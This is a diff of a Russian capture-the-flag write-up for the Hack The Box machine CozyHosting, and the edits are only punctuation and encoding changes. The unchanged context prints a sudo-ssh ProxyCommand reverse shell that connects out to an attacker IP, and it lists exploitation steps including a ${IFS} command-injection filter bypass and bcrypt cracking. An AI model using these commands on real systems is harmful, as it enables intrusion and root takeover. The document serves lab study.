@@ -1,4 +1,4 @@
-# CozyHosting (HTB)
+﻿# CozyHosting (HTB)
 
 > Платформа: Hack The Box  
 > ОС: Linux  
@@ -190,7 +190,7 @@ nc -lvnp 5555
 sudo ssh -o ProxyCommand=';bash -c "bash -i >& /dev/tcp/10.10.14.177/5555 0>&1"' x
 ```
 
-`ssh` выполняет `ProxyCommand` до реального SSH-соединения — с правами root.
+`ssh` выполняет `ProxyCommand` до реального SSH-соединения - с правами root.
 
 ```bash
 whoami
@@ -203,7 +203,7 @@ cat /root/root.txt
 
 ## Flags
 
-| Флаг | �-начение                         |
+| Флаг | �-начение                         |
 |------|----------------------------------|
 | User | <USER_FLAG> |
 | Root | <ROOT_FLAG> |
@@ -212,9 +212,9 @@ cat /root/root.txt
 
 ## Key Takeaways
 
-- **Spring Boot Actuator** — `/actuator/sessions` отдаёт ID сессий без авторизации.
-- **Command Injection через `${IFS}`** — обход фильтра пробелов.
-- **Распаковка JAR** — `application.properties` часто содержит креды БД.
-- **bcrypt-хеши в PostgreSQL** — брутфорс через hashcat mode 3200.
-- **Password reuse** — пароль админа веб-панели совпал с SSH.
-- **`sudo ssh` + `ProxyCommand`** — GTFOBins-вектор, эквивалентный полному root shell.
+- **Spring Boot Actuator** - `/actuator/sessions` отдаёт ID сессий без авторизации.
+- **Command Injection через `${IFS}`** - обход фильтра пробелов.
+- **Распаковка JAR** - `application.properties` часто содержит креды БД.
+- **bcrypt-хеши в PostgreSQL** - брутфорс через hashcat mode 3200.
+- **Password reuse** - пароль админа веб-панели совпал с SSH.
+- **`sudo ssh` + `ProxyCommand`** - GTFOBins-вектор, эквивалентный полному root shell.
